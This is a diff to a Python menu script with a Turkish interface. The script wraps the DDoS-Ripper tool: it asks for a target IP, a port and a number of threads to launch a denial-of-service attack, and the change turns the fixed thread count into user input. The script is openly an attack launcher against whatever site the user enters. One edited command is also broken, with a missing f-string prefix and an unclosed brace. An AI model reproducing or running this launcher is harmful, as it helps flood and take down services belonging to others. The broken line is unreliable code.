@@ -159,19 +159,19 @@ while True:
 		dds = input(f"{SARI}Sizde {RESET}{MOR}DDoS-Ripper{RESET} {SARI}adlı tool varmı{RESET} {MAVI}[Y/N]{RESET}:    ")
 		if dds == "y":
 			dsi = input(f"{SARI}ddos atmak istediğiniz IP adresini girin{RESET}:    ")
+			dpst = input(f"{SARI}ddos atmak istediğiniz sitenin aynı anda kaç paket göndersin {RESET}{CYAN}[135 ila 443 arasından seçin]:    {RESET}")
 			dps = input(f"{SARI}ddos atmak istediğiniz sitenin açık port'unu biliyormusunuz{RESET}{MAVI}[Y/N]{RESET}:    ")
 			if dps == "y":
 				dy = os.path.expanduser("~/DDoS-Ripper/")
 				os.chdir(dy)
 				dsp = input(f"{SARI}Sitenin açık port'unu girin{RESET}:    ")
-				os.system(f"python3 DRipper.py -s {dsi} -p {dsp} -t 135")
+				os.system(f"python3 DRipper.py -s {dsi} -p {dsp} -t {dpst}")
 				input(f"{KIRMIZI}DDOS{RESET} {CYAN}saldırısı bitmiştir devam etmek için enter'a tıklayın{RESET}")
 				os.system("clear")
 			elif dps == "n":
 				dys = os.path.expanduser("~/DDoS-Ripper/")
 				os.chdir(dys)
-				dsi2 = input(f"{SARI}ddos atmak istediğiniz IP adresini girin{RESET}:    ")
-				os.system("python3 DRipper.py -s {dsi2} -t 135")
+				os.system("python3 DRipper.py -s {dsi} -t {dpst")
 				input(f"{KIRMIZI}DDOS{RESET} {CYAN}saldırısı bitmiştir devam etmek için enter'a tıklayın{RESET}")
 				os.system("clear")
 		elif dds == "n":
